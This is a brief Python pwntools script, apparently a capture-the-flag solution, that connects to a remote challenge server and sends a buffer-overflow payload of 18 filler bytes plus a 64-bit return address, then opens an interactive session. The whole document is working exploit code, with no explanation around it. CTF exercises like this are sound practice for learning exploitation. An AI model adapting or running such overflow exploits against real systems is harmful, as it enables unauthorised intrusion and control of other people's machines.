from pwn import *

offset = 18

r = remote("challs.xmas.htsp.ro", 12006)

payload = b"a" * 18 + p64(0x401156)

r.sendafter("?", payload)

r.interactive()


